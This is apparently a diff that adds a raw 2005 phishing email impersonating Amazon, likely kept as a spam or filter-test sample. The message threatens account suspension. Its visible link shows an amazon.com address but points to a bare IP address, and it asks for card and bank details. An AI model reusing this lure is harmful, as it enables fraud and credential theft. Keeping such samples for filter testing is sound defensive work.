@@ -1,0 +1,42 @@
+Return-Path: <account-update@amazon.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 14357 invoked by uid 115); 6 Jul 2005 13:27:47 -0000
+Received: from account-update@amazon.com by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(220.80.108.139):. 
+ Processed in 0.162038 secs); 06 Jul 2005 13:27:47 -0000
+Received: from unknown (HELO hosting.m-office.co.kr) (220.80.108.139)
+  by churchill.factcomp.com with SMTP; 6 Jul 2005 13:27:45 -0000
+Received: from hosting.m-office.co.kr (hosting.m-office.co.kr [127.0.0.1])
+	by hosting.m-office.co.kr (8.12.9/8.12.9) with ESMTP id j66DRXO2014377
+	for <bruceg@em.ca>; Wed, 6 Jul 2005 22:27:34 +0900
+Received: (from nobody@localhost)
+	by hosting.m-office.co.kr (8.12.9/8.12.9/Submit) id j66DRXoM014376;
+	Wed, 6 Jul 2005 22:27:33 +0900
+Date: Wed, 6 Jul 2005 22:27:33 +0900
+Message-Id: <200507061327.j66DRXoM014376@hosting.m-office.co.kr>
+To: bruceg@em.ca
+Subject: NOTICE:Managed Protection Account.
+From: "account-update@amazon.com" <account-update@amazon.com>
+Reply-To: account-update@amazon.com
+X-Priority: 1
+Content-type: text/html; charset=iso-8859-1
+MIME-Version: 1.0
+
+
+<P class=MsoNormal style="mso-margin-top-alt: auto; mso-margin-bottom-alt: auto"><FONT face="Times New Roman" size=3><SPAN style="FONT-SIZE: 12pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <A href="http://www.amazon.com/exec/obidos/subst/home/home.html/104-8758009-0111117" target=_blank><SPAN style="TEXT-DECORATION: none"><IMG id=_x0000_i1025 height=42 alt="Amazon.com Logo" src="https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/logo-and-your-done.gif" width=155 border=0 NOSEND="1"></SPAN></A></SPAN></FONT></P>
+<P class=MsoNormal style="mso-margin-top-alt: auto; mso-margin-bottom-alt: auto"><FONT face="Times New Roman" size=3><SPAN style="FONT-SIZE: 12pt"></SPAN></FONT>&nbsp;</P>
+<P align=center><FONT face=Arial><STRONG><FONT color=black><FONT size=3>Dear amazon.com costumer,<BR></FONT><BR><MAP name=right_top_nav_map><AREA shape=RECT target=_blank coords=0,0,80,21 href="http://mail.yahoo.com/config/login?/_javascript:ol('http://www.amazon.com/gp/cart/view.html/ref%3dtop_nav_sb_gateway/104-1971006-0230350');"><AREA id=topnav_wishlist shape=RECT target=_blank coords=85,0,151,21 href="http://mail.yahoo.com/config/login?/_javascript:ol('http://www.amazon.com/gp/registry/registry.html/ref%3dcm_wl_topnav_gateway/104-1971006-0230350?type%3dwishlist');"><AREA shape=RECT target=_blank coords=155,0,256,21 href="http://mail.yahoo.com/config/login?/_javascript:ol('http://mail.yahoo.com/config/login?/exec/obidos/account-access-login/ref%3dtop_nav_ya_gateway/104-1971006-0230350');"><AREA shape=RECT target=_blank coords=260,0,299,21 href="http://mail.yahoo.com/config/login?/_javascript:ol('http://mail.yahoo.com/config/login?/exec/obidos/tg/browse/-/508510/ref%3dtop!
+ _nav_hp_gateway/104-1971006-0230350');"></MAP><MAP name=gateway_nav_map><AREA shape=RECT target=_blank coords=0,0,122,28 href="http://mail.yahoo.com/config/login?/_javascript:ol('http://mail.yahoo.com/config/login?/exec/obidos/tg/stores/static/-/gateway/international-gateway/ref%3dgw_subnav_in/104-1971006-0230350');"><AREA shape=RECT target=_blank coords=123,0,228,28 href="http://mail.yahoo.com/config/login?/_javascript:ol('http://mail.yahoo.com/config/++++++++++++login?/exec/obidos/tg/new-for-you/top-sellers/-/main/ref%3dgw_subnav_ts/104-1971006-0230350');"><AREA shape=RECT target=_blank coords=230,0,345,28 href="http://mail.yahoo.com/config/login?/_javascript:ol('http://mail.yahoo.com/config/login?/exec/obidos/tg/browse/-/909656/ref%3dstuffandsubnav_td1_/104-1971006-0230350');"></MAP><FONT size=3>&nbsp;We regret to inform you that your&nbsp;Amazon account could be suspended if&nbsp; you&nbsp; don't resolve your problems. </FONT></FONT></STRONG></FONT><FONT size=3><BR><FON!
+ T face=Arial color=black><STRONG>Due to recent activity, inclu!
+ ding pos
+sible unauthorized listings, we have temporarily suspended activity on your account in order to allow us to investigate this matter further. If you believe that this action may have been taken in error, or, if you feel that your account may have been tampered with, please contact our Live Help team so that we can provide additional information and work with you to resolve this issue. <BR><BR>You can reach the Account Theft Live Help team by clicking the "Security Center" link located below on this page You will have to complete the form below and you will receive our email in 12 hours&nbsp;after clicking "Sign In" link:<BR></STRONG></FONT><A href="http://84.244.7.52/.amazon.com/index.html"><FONT face=Arial color=black><STRONG>http://update.amazon.com/?sahj=wqyyy&amp;sas=w377sahsa&amp;id=34786837dhd</STRONG></FONT></A><BR><FONT face=Arial color=black><STRONG>&nbsp;Complete the form below , with all your corect information wroted by you las time you changed / updated or maked !
+ your acount .</STRONG></FONT></FONT></P>
+<P align=center><FONT face=Arial color=black size=3><STRONG>Please note that this suspension does not relieve you of your <BR>agreed-upon obligation to pay any fees you may owe to Amazon.</STRONG></FONT></P>
+<P align=center><FONT face=Arial color=black size=3><STRONG>Regards,</STRONG></FONT></P>
+<P align=center><FONT face=Arial color=black size=3><STRONG>Safeharbor Department<BR>Amazon, Inc.</STRONG></FONT></P>
+<P align=center><FONT size=3><FONT face=Arial color=black><STRONG>Verify your identity </STRONG></FONT></P>
+<P><FONT face=Arial color=black><STRONG></STRONG></FONT></P>
+<P><FONT face=Arial><STRONG><FONT color=black>All information is required and is kept confidential in accordance with&nbsp;<U>amazon.com </U></FONT></STRONG></FONT><A href="http://amazon.com/" target=_blank><FONT face=Arial color=black><STRONG>Privacy Policy</STRONG></FONT></A><FONT face=Arial color=black><STRONG>. </STRONG></FONT></P>
+<P><FONT face=Arial color=black><STRONG></STRONG></FONT></P>
+<UL>
+<LI><FONT face=Arial color=black><STRONG>Your credit/debit card and checking account information is used to verify your identity.</STRONG></FONT></FONT></LI></UL></TABLE>
